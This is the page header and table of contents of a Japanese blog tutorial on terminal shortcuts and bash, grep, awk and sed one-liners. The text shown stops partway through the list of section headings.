<!doctype html><html lang=ja-jp>
<head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=google-site-verification content="GjZA39yW9nL5F-rpFgxBuJd8TcTapj6xw7YLY9XbA8A">
<link rel=icon href=https://suzukiiichiro.github.io/assets/images/favicon/favicon.svg type=image/svg+xml>
<link rel=apple-touch-icon type=image/png href=https://suzukiiichiro.github.io/assets/images/favicon/apple-touch-icon-180x180.png>
<link rel=icon type=image/png href=https://suzukiiichiro.github.io/assets/images/favicon/icon-192x192.png>
<meta name=description content="シェルスクリプト１０００本ノック これからシェルスクリプトを勉強する人、なんとか本を見ながらかけるようになった人、バリバリ書いてきたけど、まだ">
<meta name=keywords content="ワンライナー,Bash,シェルスクリプト,１０００本ノック,ターミナル,TIPS,マニアックコマンド,コマンド活用,鈴木維一郎,Webデザイン,Webサイト開発,bash,CSS,サーバ">
<title>シェルスクリプト１０００本ノック｜NLP</title>
<link rel=stylesheet href=https://suzukiiichiro.github.io/scss/style.min.css>
<link rel=stylesheet href=https://suzukiiichiro.github.io/css/normalize.min.css>
<link rel=stylesheet href=https://suzukiiichiro.github.io/scss/override.min.css>
<link rel=stylesheet href=https://suzukiiichiro.github.io/scss/custom.min.css>
<meta property="og:title" content="シェルスクリプト１０００本ノック｜NLP">
<meta property="og:description" content="シェルスクリプト１０００本ノック これからシェルスクリプトを勉強する人、なんとか本を見ながらかけるようになった人、バリバリ書いてきたけど、まだ">
<meta property="og:url" content="https://suzukiiichiro.github.io/posts/2023-02-01-01-oneliner-suzuki/">
<meta property="og:site_name" content="NLP">
<meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="ワンライナー"><meta property="article:tag" content="Bash"><meta property="article:tag" content="シェルスクリプト"><meta property="article:tag" content="１０００本ノック"><meta property="article:tag" content="ターミナル"><meta property="article:tag" content="TIPS"><meta property="article:tag" content="マニアックコマンド"><meta property="article:tag" content="コマンド活用"><meta property="article:tag" content="鈴木維一郎"><meta property="article:published_time" content="2023-02-01T13:08:01+09:00"><meta property="article:modified_time" content="2023-02-15T13:00:36+09:00"><meta property="og:image" content="https://suzukiiichiro.github.io/posts/2023-02-01-01-oneliner-suzuki/shellscript.jpg">
<meta name=twitter:title content="シェルスクリプト１０００本ノック｜NLP">
<meta name=twitter:description content="シェルスクリプト１０００本ノック これからシェルスクリプトを勉強する人、なんとか本を見ながらかけるようになった人、バリバリ書いてきたけど、まだ"><meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="https://suzukiiichiro.github.io/posts/2023-02-01-01-oneliner-suzuki/shellscript.jpg"><meta name=google-site-verification content="UkPHZN1iNRRN6BWnpUWNpNbk1KXAKuS1_0kZRhu6ock">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-PE15Z9ML80"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config',"G-PE15Z9ML80",{custom_map:{dimension1:'image_url'},image_url:'/posts/2023-02-01-01-oneliner-suzuki/shellscript.jpg'})</script><script type=application/ld+json>[{"@context":"https://schema.org","@type":"BlogPosting","headline":"シェルスクリプト１０００本ノック","mainEntityOfPage":{"@type":"WebPage","@id":"https://suzukiiichiro.github.io/categories/programming/"},"image":["https://suzukiiichiro.github.io/posts/2023-02-01-01-oneliner-suzuki/shellscript.jpg"],"datePublished":"2023-02-01T13:08:01+09:00","dateModified":"2023-02-15T13:00:36+09:00","publisher":{"@type":"Organization","name":"NLP - 最新技術やプログラム、デザインなど様々な情報を提供するサイト","logo":{"@type":"ImageObject","url":"https://suzukiiichiro.github.io//images/logo.png"}},"author":{"@type":"Person","name":"suzukiiichiro","url":["https://github.com/nlp","https://suzukiiichiro.github.io/authors/suzuki/"]}},{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"NLP","item":"https://suzukiiichiro.github.io/"},{"@type":"ListItem","position":2,"name":"Posts","item":"https://suzukiiichiro.github.io/posts/"},{"@type":"ListItem","position":3,"name":"シェルスクリプト１０００本ノック","item":"https://suzukiiichiro.github.io/posts/2023-02-01-01-oneliner-suzuki/"}]}]</script>
</head>
<body class=article-page>
<script>(function(){const a='StackColorScheme';localStorage.getItem(a)||localStorage.setItem(a,"auto")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
<div class="container main-container flex
on-phone--column extended">
<div class="sidebar left-sidebar sticky">
<button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=メニューを開く・閉じる>
<span class=hamburger-box>
<span class=hamburger-inner></span>
</span>
</button>
<header class=site-info><div class="site-name site-avatar"><a href=https://suzukiiichiro.github.io/>
<picture>
<source src=https://suzukiiichiro.github.io/images/logo_hu492d4071ba1c5fc31251c8d6beb6380e_133587_60x0_resize_box_3.png srcset="https://suzukiiichiro.github.io/images/logo_hu492d4071ba1c5fc31251c8d6beb6380e_133587_60x0_resize_box_3.png 1x, https://suzukiiichiro.github.io/images/logo_hu492d4071ba1c5fc31251c8d6beb6380e_133587_120x0_resize_box_3.png 2x" media="(min-width: 769px)" width=60 height=60>
<source src=https://suzukiiichiro.github.io/images/logo_hu492d4071ba1c5fc31251c8d6beb6380e_133587_30x0_resize_box_3.png srcset="https://suzukiiichiro.github.io/images/logo_hu492d4071ba1c5fc31251c8d6beb6380e_133587_30x0_resize_box_3.png 1x, https://suzukiiichiro.github.io/images/logo_hu492d4071ba1c5fc31251c8d6beb6380e_133587_60x0_resize_box_3.png 2x" media="(max-width: 768px)" width=30 height=30>
<img src=https://suzukiiichiro.github.io/images/logo_hu492d4071ba1c5fc31251c8d6beb6380e_133587_60x0_resize_box_3.png srcset="https://suzukiiichiro.github.io/images/logo_hu492d4071ba1c5fc31251c8d6beb6380e_133587_60x0_resize_box_3.png 1x, https://suzukiiichiro.github.io/images/logo_hu492d4071ba1c5fc31251c8d6beb6380e_133587_120x0_resize_box_3.png 2x" width=60 height=60 class=site-logo loading=lazy alt=NLP>
</picture>
</a></div>
<h2 class=site-description>最新技術やプログラム、デザインなど様々な情報を提供するサイト</h2></header>
<div id=main-menu>
<div id=main-menu-area>
<nav class="menu menu-section" id=categories-menu>
<ul class=menu-list id=main-cat>
<li><a href=https://suzukiiichiro.github.io/ id=link-top>TOP</a></li>
<li>
<a href=https://suzukiiichiro.github.io/categories/ id=link-category>カテゴリ</a>
<ul class=menu-list>
<li>
<a href=https://suzukiiichiro.github.io/categories/programming/ class=font_size_251>
プログラミング
</a>
</li>
<li>
<a href=https://suzukiiichiro.github.io/categories/web/ class=font_size_22>
Web開発
</a>
</li>
<li>
<a href=https://suzukiiichiro.github.io/categories/server/ class=font_size_2>
サーバー構築
</a>
</li>
<li>
<a href=https://suzukiiichiro.github.io/categories/linux/ class=font_size_1>
Linux
</a>
</li>
</ul>
</li>
</ul>
</nav>
<nav>
<ol class="menu menu-section"><li>
<a href=https://suzukiiichiro.github.io/sitemap/><span>サイトマップ</span>
</a>
</li><li>
<a href=https://suzukiiichiro.github.io/ranking/><span>PVランキング</span>
</a>
</li><li>
<a href=https://suzukiiichiro.github.io/archives/><span>アーカイブ</span>
</a>
</li><li>
<a href=https://suzukiiichiro.github.io/privacy/><span>プライバシーポリシー</span>
</a>
</li><li>
<a href=https://suzukiiichiro.github.io/search/><span>サイト内検索</span>
</a>
</li></ol>
</nav>
</div>
</div>
<button type=button id=dark-mode-toggle aria-label=画面の明るさ切り替え><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24"><path d="M3.55 18.54l1.41 1.41 1.8-1.79-1.42-1.42M11 22.45c.32.0 2 0 2 0V19.5H11m1-14a6 6 0 00-6 6 6 6 0 006 6 6 6 0 006-6c0-3.32-2.69-6-6-6m8 7h3v-2H20m-2.76 7.66 1.8 1.79 1.41-1.41-1.79-1.8M20.45 4.46 19.04 3.05l-1.8 1.79 1.42 1.42M13 .55H11V3.5h2m-9 7H1v2H4M6.76 4.84 4.96 3.05 3.55 4.46l1.79 1.8L6.76 4.84z"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="#fff" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M17.75 4.09 15.22 6.03 16.13 9.09 13.5 7.28 10.87 9.09l.91-3.06L9.25 4.09 12.44 4 13.5 1l1.06 3L17.75 4.09M21.25 11l-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11 17.81 10.95 18.5 9 19.19 10.95 21.25 11m-2.28 4.95C19.8 15.87 20.69 17.05 20.16 17.8 19.84 18.25 19.5 18.67 19.08 19.07 15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24.0-14.14C5.34 4.53 5.76 4.17 6.21 3.85c.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02 2.19 2.2 5.15 3.16 8.02 2.89m-1.64 2.02c-2.83-.16-5.63-1.33-7.8-3.47-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98C9.37 20.67 14.19 20.78 17.33 17.97z"/></svg>
</button>
</div>
<main class="main full-width">
<nav class=breadcrumb-area>
<ol class=breadcrumb>
<li><a class=breadcrumb-item href=https://suzukiiichiro.github.io/>NLP</a>
<li><a class=breadcrumb-item href=https://suzukiiichiro.github.io/posts/>Posts</a>
<li><span class=breadcrumb-item>シェルスクリプト１０００本ノック</span>
</ol>
</nav>
<article class="has-image main-article">
<div class="article-details arcile-single">
<header class=article-header>
<div class=article-category>
<a href=https://suzukiiichiro.github.io/categories/programming/>
プログラミング
</a>
</div>
<div class=article-info>
<span class="article-time--item article-time--author"><span class=icon style=background-image:url(https://github.com/suzukiiichiro.png)></span><span class=name><a href=https://suzukiiichiro.github.io/authors/suzuki/>suzukiiichiro</a></span>
</span>
<time class="article-time--item article-time--published">2023.02.01</time>
<time class="article-time--item article-time--updatedate">
2023.02.15
</time>
<time class="article-time--item article-time--reading">
読了時間: 181分
</time>
</div>
</header>
<h1 class=article-title>
シェルスクリプト１０００本ノック
</h1>
</div>
<div class=article-footer>
<section class=article-tags>
<a href=https://suzukiiichiro.github.io/tags/%E3%83%AF%E3%83%B3%E3%83%A9%E3%82%A4%E3%83%8A%E3%83%BC/>ワンライナー</a>
<a href=https://suzukiiichiro.github.io/tags/bash/>Bash</a>
<a href=https://suzukiiichiro.github.io/tags/%E3%82%B7%E3%82%A7%E3%83%AB%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%88/>シェルスクリプト</a>
<a href=https://suzukiiichiro.github.io/tags/%EF%BC%91%EF%BC%90%EF%BC%90%EF%BC%90%E6%9C%AC%E3%83%8E%E3%83%83%E3%82%AF/>１０００本ノック</a>
<a href=https://suzukiiichiro.github.io/tags/%E3%82%BF%E3%83%BC%E3%83%9F%E3%83%8A%E3%83%AB/>ターミナル</a>
<a href=https://suzukiiichiro.github.io/tags/tips/>TIPS</a>
<a href=https://suzukiiichiro.github.io/tags/%E3%83%9E%E3%83%8B%E3%82%A2%E3%83%83%E3%82%AF%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89/>マニアックコマンド</a>
<a href=https://suzukiiichiro.github.io/tags/%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E6%B4%BB%E7%94%A8/>コマンド活用</a>
<a href=https://suzukiiichiro.github.io/tags/%E9%88%B4%E6%9C%A8%E7%B6%AD%E4%B8%80%E9%83%8E/>鈴木維一郎</a>
</section>
</div>
<aside class="widget archives tableOfContents">
<h2 class="widget-title section-title">目次<button type=buton id=btn-closeTOC onclick=custom.toggleTOC(event)></button></h2>
<div class=widget--toc>
<nav id=TableOfContents>
<ol>
<li><a href=#ターミナルのtips>ターミナルのTIPS</a>
<ol>
<li><a href=#ctrl-f-カーソル位置を後方に１文字ずつ移動>Ctrl f カーソル位置を後方に１文字ずつ移動</a></li>
<li><a href=#ctrl-b-カーソル位置を前方に１文字ずつ移動>Ctrl b カーソル位置を前方に１文字ずつ移動</a></li>
<li><a href=#ctrl-l-画面をクリアする>Ctrl l 画面をクリアする</a></li>
<li><a href=#ctrl-m-enterキーを使わない>Ctrl m Enterキーを使わない</a></li>
<li><a href=#ctrl-n-下矢印キーを使わない>Ctrl n 下矢印キーを使わない</a></li>
<li><a href=#ctrl-p-上矢印キーを使わない>Ctrl p 上矢印キーを使わない</a></li>
<li><a href=#ctrl-r-同じコマンドを再入力しない>Ctrl r 同じコマンドを再入力しない</a></li>
<li><a href=#ctrl-h-カーソル位置の手前の文字を削除backspaceキーを使わない>Ctrl h カーソル位置の手前の文字を削除（BackSpaceキーを使わない）</a></li>
<li><a href=#ctrl-a-コマンド行先頭へジャンプ>Ctrl a コマンド行先頭へジャンプ</a></li>
<li><a href=#ctrl-e-コマンド行末へジャンプ>Ctrl e コマンド行末へジャンプ</a></li>
<li><a href=#ctrl-d-カーソル位置の文字を削除backspcedeleteとは異なります>Ctrl d カーソル位置の文字を削除（BackSpce/deleteとは異なります）</a></li>
<li><a href=#ctrl-u-カーソル位置の手前から行頭までのすべてのテキストを削除>Ctrl u カーソル位置の手前から行頭までのすべてのテキストを削除</a></li>
<li><a href=#ctrl-k-カーソル位置から行末までのすべてのテキストを削除>Ctrl k カーソル位置から行末までのすべてのテキストを削除</a></li>
<li><a href=#ctrl-x-backspace-カーソル位置から行頭までのすべてのテキストを削除します>Ctrl x BackSpace カーソル位置から行頭までのすべてのテキストを削除します。</a></li>
<li><a href=#ctrl-t-前後の文字を入れ替え>Ctrl t 前後の文字を入れ替え</a></li>
<li><a href=#ctrl-w-カーソル位置の手前の単語を切り取り貼り付ける>Ctrl w カーソル位置の手前の単語を切り取り貼り付ける</a></li>
<li><a href=#ctrl-u-カーソル位置の手前から行頭を切り取り貼り付けます>Ctrl u カーソル位置の手前から行頭を切り取り貼り付けます。</a></li>
<li><a href=#超裏技-esc-shift-3-コマンドライン行をコメントアウトして改行>【超裏技】 Esc #(Shift 3) コマンドライン行をコメントアウトして改行</a></li>
<li><a href=#一般的な方法-ctrl-a--shift-3>一般的な方法 Ctrl a ＋ #(Shift 3)</a></li>
<li><a href=#超裏技-esc--shift-3>超裏技 Esc ＋ #（Shift 3）</a></li>
</ol>
</li>
<li><a href=#bashのtips>bashのTIPS</a>
<ol>
<li><a href=#set--ueo>set -ueo</a></li>
<li><a href=#変数の型を指定する>変数の型を指定する</a></li>
<li><a href=#ローカル変数を定義する>ローカル変数を定義する</a></li>
<li><a href=#インクリメント>インクリメント</a></li>
<li><a href=#if-c言語やjavaのような条件式で記述する>if C言語やJavaのような条件式で記述する</a></li>
<li><a href=#while-c言語やjavaのような条件式で記述する>while C言語やJavaのような条件式で記述する</a></li>
<li><a href=#for-c言語やjavaのような条件式で記述する>for C言語やJavaのような条件式で記述する</a></li>
<li><a href=#grepで該当文字列があったら反応する>grepで該当文字列があったら反応する</a></li>
<li><a href=#長い行の改行について>長い行の改行について</a></li>
<li><a href=#関数パラメータは変数に格納する>関数パラメータは変数に格納する</a></li>
<li><a href=#スクリプトのデバッグ>スクリプトのデバッグ</a></li>
<li><a href=#デバッグモードのフラグを使う>デバッグモードのフラグを使う</a></li>
<li><a href=#マルチラインコメント>マルチラインコメント</a></li>
</ol>
</li>
<li><a href=#grep-のtips>grep のTIPS</a>
<ol>
<li><a href=#カラー表示>カラー表示</a></li>
<li><a href=#構文>構文</a></li>
<li><a href=#一致する文字列を検索>一致する文字列を検索</a></li>
<li><a href=#一致しない文字列のみを検索>一致しない文字列のみを検索</a></li>
<li><a href=#大文字と小文字を区別しない一致の検索文字列>大文字と小文字を区別しない一致の検索文字列</a></li>
<li><a href=#単語全体のみを検索>単語全体のみを検索</a></li>
<li><a href=#現在のディレクトリで複数のファイルを検索する>現在のディレクトリで複数のファイルを検索する</a></li>
<li><a href=#ディレクトリを再帰的に検索する>ディレクトリを再帰的に検索する</a></li>
<li><a href=#行番号を出力に追加します>行番号を出力に追加します</a></li>
<li><a href=#一致する行の後に特定の行数を出力します>一致する行の後に特定の行数を出力します</a></li>
<li><a href=#一致する行の前に特定の行数を出力します>一致する行の前に特定の行数を出力します</a></li>
<li><a href=#一致する行の前後の特定の行数を出力>一致する行の前後の特定の行数を出力</a></li>
<li><a href=#ブラケットを使用して特定の数字を一致させる>ブラケットを使用して特定の数字を一致させる[]</a></li>
<li><a href=#3番目のブラケットを使用してパターンを特定の文字と一致させる>3番目のブラケットを使用してパターンを特定の文字と一致させる[]</a></li>
<li><a href=#alnumクラスを使用してアルファベットと数字を一致させる>[：alnum：]クラスを使用してアルファベットと数字を一致させる</a></li>
<li><a href=#alphaクラスを使用してアルファベット文字を照合する>[：alpha：]クラスを使用してアルファベット文字を照合する</a></li>
<li><a href=#digitクラスを使用して数字を照合する>[：digit：]クラスを使用して数字を照合する</a></li>
<li><a href=#lowerクラスを使用して小文字を照合する>[：lower：]クラスを使用して小文字を照合する</a></li>
<li><a href=#spaceクラスを使用してスペース文字を一致させる>[：space：]クラスを使用してスペース文字を一致させる</a></li>
<li><a href=#行頭からの検索>行頭からの検索</a></li>
<li><a href=#行の終わりに一致する>行の終わりに一致する</a></li>
<li><a href=#連結との一致>連結との一致</a></li>
</ol>
</li>
<li><a href=#awk-のtips>awk のTIPS</a>
<ol>
<li><a href=#タブを列セパレータとして設定>タブを列セパレータとして設定</a></li>
<li><a href=#タブ区切りとして出力-列区切りとしても>タブ区切りとして出力 (列区切りとしても)</a></li>
<li><a href=#変数を渡す>変数を渡す</a></li>
</ol>
</li>
<li><a href=#sed-のtips>sed のTIPS</a>
<ol>
<li><a href=#sed連結>sed連結</a></li>
<li><a href=#sedの速度最適化>sedの速度最適化</a></li>
</ol>
</li>
<li><a href=#空白行や改行の扱い>空白行や改行の扱い</a>
<ol>
<li><a href=#sed-行末を行末改行に置き換えます>sed 行末を行末＋改行に置き換えます。</a></li>
<li><a href=#awk-行末を行末改行に置き換えます>awk 行末を行末＋改行に置き換えます。</a></li>
<li><a href=#awk-行末を行末改行に置き換えます-1>awk 行末を行末＋改行に置き換えます。</a></li>
<li><a href=#sed-行末を行末改行ｘ２に置き換えます>sed 行末を（行末＋改行）ｘ２に置き換えます</a></li>
<li><a href=#awk-行末を行末改行ｘ２に置き換えます>awk 行末を（行末＋改行）ｘ２に置き換えます</a></li>
<li><a href=#sed-１行おきに空白行を挿入します>sed １行おきに空白行を挿入します</a></li>
<li><a href=#awk-列数を出力>awk 列数を出力</a></li>
<li><a href=#awk-１行おきに空白行を挿入します>awk １行おきに空白行を挿入します。</a></li>
<li><a href=#sed-偶数行の空白行を削除します>sed 偶数行の空白行を削除します</a></li>
<li><a href=#sed-パターンに一致するすべての行の上に空白行を挿入>sed パターンに一致するすべての行の上に空白行を挿入</a></li>
<li><a href=#sed-パターンに一致するすべての行の下に空白行を挿入>sed パターンに一致するすべての行の下に空白行を挿入</a></li>
<li><a href=#sed-パターンに一致するすべての行の上下に空白行を挿入>sed パターンに一致するすべての行の上下に空白行を挿入</a></li>
<li><a href=#sed-ファイルの末尾に空白行を追記>sed ファイルの末尾に空白行を追記</a></li>
<li><a href=#sed-awk-空白行の操作>sed awk 空白行の操作</a></li>
</ol>
</li>
<li><a href=#ファイルへの文字列の追加>ファイルへの文字列の追加</a>
<ol>
<li><a href=#sed-ファイルの末尾に文字列を追加>sed ファイルの末尾に文字列を追加</a></li>
<li><a href=#sed-ファイルの末尾に複数行の文字列を追加>sed ファイルの末尾に複数行の文字列を追加</a></li>
<li><a href=#sed-ファイルの先頭に文字列を追加-例->sed ファイルの先頭に文字列を追加 (例: &ldquo;[")</a></li>
<li><a href=#sed-ファイルの末尾に文字列を追加-例->sed ファイルの末尾に文字列を追加 (例: &ldquo;]")</a></li>
<li><a href=#sed-ページの最後に改行を追加>sed ページの最後に改行を追加</a></li>
<li><a href=#sed-すべての行の先頭に文字列を追加します-例-bbo>sed すべての行の先頭に文字列を追加します (例: &lsquo;bbo&rsquo;)</a></li>
<li><a href=#sed-各行の末尾に文字列を追加します-例->sed 各行の末尾に文字列を追加します (例: &ldquo;}")</a></li>
<li><a href=#sed-４番目の文字ごとに改行を追加します>sed ４番目の文字ごとに改行を追加します</a></li>
</ol>
</li>
<li><a href=#行番号の付与>行番号の付与</a>
<ol>
<li><a href=#sed-タブを使用して各行に左揃えで行番号を付与>sed タブを使用して各行に左揃えで行番号を付与</a></li>
<li><a href=#awk-タブを使用して各行に左揃えで行番号を付与>awk タブを使用して各行に左揃えで行番号を付与</a></li>
<li><a href=#awk-タブを使用して各行の前に行番号を付けます>awk タブを使用して各行の前に行番号を付けます。</a></li>
<li><a href=#nl-行番号を付ける-左揃え右揃えの番号>nl 行番号を付ける (左揃え、右揃えの番号)。</a></li>
<li><a href=#sed-行番号を付ける-左揃え右揃えの番号>sed 行番号を付ける (左揃え、右揃えの番号)。</a></li>
<li><a href=#awk-行番号を付ける-左揃え右揃えの番号>awk 行番号を付ける (左揃え、右揃えの番号)。</a></li>
<li><a href=#sed-行が空白でない場合にのみ行番号を付ける>sed 行が空白でない場合にのみ行番号を付ける。</a></li>
<li><a href=#awk-行が空白でない場合にのみ行番号を付ける>awk 行が空白でない場合にのみ行番号を付ける。</a></li>
<li><a href=#awk-行が空白でない場合にのみ行番号を付ける-1>awk 行が空白でない場合にのみ行番号を付ける。</a></li>
<li><a href=#awk-空白行を詰めた除去した上で行番号を付与>awk 空白行を詰めた（除去した）上で行番号を付与</a></li>
<li><a href=#sed-特定の行番号に文字列を追加します-例-1-行目と-3-行目に-something-を追加>sed 特定の行番号に文字列を追加します (例: 1 行目と 3 行目に &lsquo;something&rsquo; を追加)</a></li>
<li><a href=#awk-行番号と各行の文字数を出力する>awk 行番号と各行の文字数を出力する</a></li>
<li><a href=#awk-すべての行に番号インデックスを付ける>awk すべての行に番号/インデックスを付ける</a></li>
</ol>
</li>
<li><a href=#行カウント>行カウント</a>
<ol>
<li><a href=#wc-行のカウント>wc 行のカウント</a></li>
<li><a href=#sed-行のカウント>sed 行のカウント</a></li>
<li><a href=#awk-行のカウント>awk 行のカウント</a></li>
</ol>
</li>
<li><a href=#行列の計算と操作>行列の計算と操作</a>
<ol>
<li><a href=#awk-行a列とb列の合計を出力>awk 行（A列とB列）の合計を出力</a></li>
<li><a href=#awk-行a列とb列とc列の合計を出力>awk 行（A列とB列とC列）の合計を出力</a></li>
<li><a href=#awk-各列の値が０より小さい場合に特定の文字列にに置き換える>awk 各列の値が０より小さい場合に特定の文字列にに置き換える</a></li>
<li><a href=#awk-各行の列数を出力その後に次の行を出力>awk 各行の列数を出力、その後に次の行を出力</a></li>
<li><a href=#awk-各行の最後の列を出力>awk 各行の最後の列を出力</a></li>
<li><a href=#awk-最初の列を除くすべてを出力>awk 最初の列を除くすべてを出力</a></li>
<li><a href=#awk-最後の行の最後の列を出力>awk 最後の行の最後の列を出力</a></li>
<li><a href=#awk-３つ以上の列を含むすべての行を出力>awk ３つ以上の列を含むすべての行を出力</a></li>
<li><a href=#awk-最後の列の値が-2-であるすべての行を出力>awk 最後の列の値が >2 であるすべての行を出力</a></li>
<li><a href=#perl-各行の最初の列の値と最後の列の値の合計を出力します>perl 各行の最初の列の値と最後の列の値の合計を出力します。</a></li>
<li><a href=#perl-列のすべての数値を-1-増やします>perl 列のすべての数値を 1 増やします。</a></li>
<li><a href=#perl-すべての列の値を合計します>perl すべての列の値を合計します。</a></li>
<li><a href=#awk-行を並べ替える>awk 行を並べ替える</a></li>
<li><a href=#awk-２つの列を逆順で出力>awk ２つの列を逆順で出力</a></li>
<li><a href=#awk-２つの列を逆順で出力-1>awk ２つの列を逆順で出力</a></li>
<li><a href=#awk-列にカンマがあるかどうかを確認します-例-列-1>awk 列にカンマがあるかどうかを確認します (例: 列 $1)</a></li>
<li><a href=#cut-２列目以降を出力>cut ２列目以降を出力</a></li>
<li><a href=#awk-２列目以降を出力>awk ２列目以降を出力</a></li>
<li><a href=#awk-列間にカンマ区切りを使用して5-行ごとに入力を連結します>awk 列間にカンマ区切りを使用して、5 行ごとに入力を連結します。</a></li>
<li><a href=#join-指定した列を使用して結合>join 指定した列を使用して結合</a></li>
<li><a href=#awk-列の先頭に文字列を追加します-たとえば列-3-にchrを追加します>awk 列の先頭に文字列を追加します (たとえば、列 $3 に「chr」を追加します)。</a></li>
<li><a href=#awk-最後の列を削除>awk 最後の列を削除</a></li>
<li><a href=#join-2-つのファイルを列ごとにタブで結合>join 2 つのファイルを列ごとにタブで結合</a></li>
<li><a href=#rev-cut-ファイルの最後の列を切り取って取得する>rev cut ファイルの最後の列を切り取って取得する</a></li>
<li><a href=#rev-cut-最後の列を切り取る>rev cut 最後の列を切り取る</a></li>
</ol>
</li>
<li><a href=#数値の変換>数値の変換</a>
<ol>
<li><a href=#awk-ファイル内のすべての番号を四捨五入>awk ファイル内のすべての番号を四捨五入</a></li>
<li><a href=#awk-ファイルの平均>awk ファイルの平均</a></li>
<li><a href=#awk-前の行の値を減算します>awk 前の行の値を減算します</a></li>
<li><a href=#gsed-数値文字列に３桁区切りを付与>gsed 数値文字列に３桁区切りを付与</a></li>
<li><a href=#gsed-数値文字列に３桁区切りを付与-1>gsed 数値文字列に３桁区切りを付与</a></li>
<li><a href=#sed-小数点とマイナス記号を含む数値にカンマを追加>sed 小数点とマイナス記号を含む数値にカンマを追加</a></li>
</ol>
</li>
<li><a href=#単語や文字列のカウント>単語や文字列のカウント</a>
<ol>
<li><a href=#awk-すべての行の列-単語-の総数を出力>awk すべての行の列 (「単語」) の総数を出力</a></li>
<li><a href=#awk-特定の単語を含む列の単語の総数を出力>awk 特定の単語を含む列の（「単語」）の総数を出力</a></li>
<li><a href=#awk-特定の文字列を含む行数をカウント>awk 特定の文字列を含む行数をカウント</a></li>
<li><a href=#awk-最大文字列長を含む行を出力>awk 最大文字列長を含む行を出力</a></li>
</ol>
</li>
<li><a href=#改行や空白の操作>改行や空白の操作</a>
<ol>
<li><a href=#tr-改行をスペースに変換します>tr 改行をスペースに変換します。</a></li>
<li><a href=#tr-crlf-を-lf-形式に変換します>tr CRLF を LF 形式に変換します。</a></li>
<li><a href=#sed-先頭の空白とタブを削除>sed 先頭の空白とタブを削除</a></li>
<li><a href=#awk-各行の終わりから末尾の空白-スペースタブ-を削除します>awk 各行の終わりから末尾の空白 (スペース、タブ) を削除します。</a></li>
<li><a href=#sed-各行から先頭と末尾の両方の空白を削除します>sed 各行から先頭と末尾の両方の空白を削除します。</a></li>
<li><a href=#awk-各行から先頭と末尾の両方の空白を削除します>awk 各行から先頭と末尾の両方の空白を削除します。</a></li>
<li><a href=#awk-各行から先頭と末尾の両方の空白を削除します-1>awk 各行から先頭と末尾の両方の空白を削除します。</a></li>
<li><a href=#sed-各行の終わりから末尾の空白-スペースタブ-を削除します>sed 各行の終わりから末尾の空白 (スペース、タブ) を削除します。</a></li>
<li><a href=#sed-各行の先頭に-5-つの空白を挿入します-ページ-オフセットを作成します>sed 各行の先頭に 5 つの空白を挿入します (ページ オフセットを作成します)。</a></li>
<li><a href=#awk-各行の先頭に-5-つの空白を挿入します-ページ-オフセットを作成します>awk 各行の先頭に 5 つの空白を挿入します (ページ オフセットを作成します)。</a></li>
<li><a href=#sed-２行間の改行を削除>sed ２行間の改行を削除</a></li>
</ol>
</li>
<li><a href=#水平位置の揃え方>水平位置の揃え方</a>
<ol>
<li><a href=#sed-各行の先頭から先頭の空白-スペースタブ-を削除しすべてのテキストを揃えて左揃えにします>sed 各行の先頭から先頭の空白 (スペース、タブ) を削除し、すべてのテキストを揃えて左揃えにします。</a></li>
<li><a href=#awk-各行の先頭から先頭の空白-スペースタブ-を削除しすべてのテキストを揃えて左揃えにします>awk 各行の先頭から先頭の空白 (スペース、タブ) を削除し、すべてのテキストを揃えて左揃えにします。</a></li>
<li><a href=#sed-テキストを列幅79で右揃えにします>sed テキストを列幅79で右揃えにします。</a></li>
<li><a href=#awk-テキストを列幅79で右揃えにします>awk テキストを列幅79で右揃えにします。</a></li>
<li><a href=#sed-テキストを列幅79で中央揃えにします>sed テキストを列幅79で中央揃えにします。</a></li>
<li><a href=#awk-テキストを列幅79で中央揃えにします>awk テキストを列幅79で中央揃えにします。</a></li>
</ol>
</li>
<li><a href=#検索と置換>検索と置換</a>
<ol>
<li><a href=#sed-bazを含む行のfooをbarに置き換えます>sed bazを含む行のfooをbarに置き換えます。</a></li>
<li><a href=#awk-bazを含む行のfooをbarに置き換えます>awk bazを含む行のfooをbarに置き換えます。</a></li>
<li><a href=#sed-bazを除く行のfooをbarに置き換えます>sed bazを除く行のfooをbarに置き換えます。</a></li>
<li><a href=#awk-bazを除く行のfooをbarに置き換えます>awk bazを除く行のfooをbarに置き換えます。</a></li>
<li><a href=#sed-scarletまたはrubyまたはpuceをredに変更します>sed scarletまたはrubyまたはpuceをredに変更します。</a></li>
<li><a href=#gsed-scarletまたはrubyまたはpuceをredに変更します>gsed scarletまたはrubyまたはpuceをredに変更します。</a></li>
<li><a href=#awk-scarletまたはrubyまたはpuceをredに変更します>awk scarletまたはrubyまたはpuceをredに変更します。</a></li>
<li><a href=#sed-文中の最初のfooだけをbarに置換>sed 文中の最初のfooだけをbarに置換</a></li>
<li><a href=#awk-文中の最初のfooだけをbarに置換>awk 文中の最初のfooだけをbarに置換</a></li>
<li><a href=#sed-文中の４つ目のfooだけをbarに置換>sed 文中の４つ目のfooだけをbarに置換</a></li>
